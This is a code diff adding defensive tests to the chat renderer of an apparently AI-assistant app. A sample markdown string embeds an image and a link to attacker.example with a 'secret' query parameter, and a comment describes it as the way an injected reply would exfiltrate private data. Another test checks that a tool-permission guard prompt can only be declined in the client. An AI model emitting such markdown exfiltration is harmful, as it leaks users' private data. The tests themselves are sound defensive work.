@@ -24,6 +24,18 @@ describe("markdown", () => {
     expect(html).toContain('href="https://example.com"');
     expect(html).not.toContain("javascript:");
   });
+
+  it("never loads a remote image, showing its alt text, and names a link's real url", () => {
+    // What an injected reply would use to send private data out: an image's url, or a link
+    // whose text hides where it goes.
+    const html = renderToStaticMarkup(
+      <Markdown text={"![your inbox](https://attacker.example/p.png?d=secret) and [the docs](https://attacker.example/x?d=secret)"} onOpen={noop} />,
+    );
+    expect(html).not.toContain("<img");
+    expect(html).not.toMatch(/src="(https?:)?\/\//);
+    expect(html).toContain('<span class="image-alt">your inbox</span>');
+    expect(html).toContain('title="https://attacker.example/x?d=secret"');
+  });
 });
 
 describe("a question", () => {
@@ -42,6 +54,17 @@ describe("a question", () => {
     expect(html).toContain("src/b.rs");
     expect(html).not.toContain("<button");
     expect(html).not.toContain("<input");
+  });
+
+  it("sends the guard's question to Ailfred's window: no answer here, only Decline", () => {
+    // `ailfred_core::reply::LOCAL_ONLY`: the server refuses a client's answer to it.
+    const guard = { ...question, prompt: "Ailfred guard: allow these actions on your connected apps?\n\nGMAIL_SEND_EMAIL", options: ["Yes", "No"], multi: false };
+    const html = renderToStaticMarkup(<QuestionView part={guard} open onAnswer={noop} onDecline={noop} />);
+    expect(html).toContain("GMAIL_SEND_EMAIL");
+    expect(html).toContain("Answer in Ailfred&#x27;s window");
+    expect(html).not.toMatch(/class="option/);
+    expect(html).not.toContain("<input");
+    expect(html).toMatch(/<button[^>]*class="decline"[^>]*>Decline<\/button>/);
   });
 
   it("offers Decline while open, and shows Not answered once closed", () => {
